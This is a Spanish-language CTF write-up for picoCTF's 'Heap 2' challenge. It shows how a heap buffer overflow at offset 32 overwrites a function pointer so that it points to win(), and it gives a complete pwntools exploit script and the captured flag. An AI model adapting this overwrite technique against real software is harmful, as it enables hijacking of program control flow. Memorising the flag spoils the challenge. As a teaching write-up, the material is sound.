# Heap 2

Este ejercicio se parece mucho al ejercicio de Heap 1. Nos dan un programa y su código.

```c
./chall                    

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 
```

En este caso, si intentamos hacer lo mismo que en el ejercicio de Heap 1 tendremos un problema ya que, aunque podemos hacer un buffer overflow la condición de victoria es distinta, vamos a ver el código:

```c
        case 4:
            // Check for win condition
            check_win();
            break;
```

Como podemos ver, si le damos a la opción de Print Flag se llama a la función `check_win()`.

```c
void check_win() { ((void (*)())*(int*)x)(); }
```

Dicha función aunque parezca un jeroglífico simplemente manda el flujo del programa a la dirección de memoria almacenada en x.

Como x es la variable que podemos llegar a reemplazar haciendo uso del buffer overflow si introducimos en `x` la dirección en memoria de otra función podemos mandar el flujo del programa allí.

Justamente hay una función win que imprime la flag:

```c
void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}
```

Vamos a calcular el offset hasta la variable `x`:

```c
pwn cyclic 50     
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
```

```c
./chall

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 2
Data for buffer: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x1442a6b0  ->   aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
+-------------+-----------+
[*]   0x1442a6d0  ->   iaaajaaakaaalaaama // Variable x
```

```c
pwn cyclic -l iaaa
32 // Offset
```

Ahora que sabemos el offset vamos a hacer un script con pwntools que automatice el ataque:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("IP", PUERTO)

    return r


def main():
    r = conn()

    offset = 32
    
    payload = flat({
        offset: [
            exe.symbols.win
        ]
    })
    
    r.sendlineafter(b':', b'2')
    r.sendlineafter(b':', payload)
    r.sendlineafter(b'4', b'4')
    r.interactive()


if __name__ == "__main__":
    main()

```

Vamos a comprobar si va:

```c
python solve.py            
[*] '/home/ub1cu0/Desktop/picoCTF/heap-2/chall_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Opening connection to mimas.picoctf.net on port 60000: Done
[*] Switching to interactive mode
. Print Flag
5. Exit

Enter your choice: picoCTF{and_down_the_road_we_go_7c8d6f32}
```

Funciona!
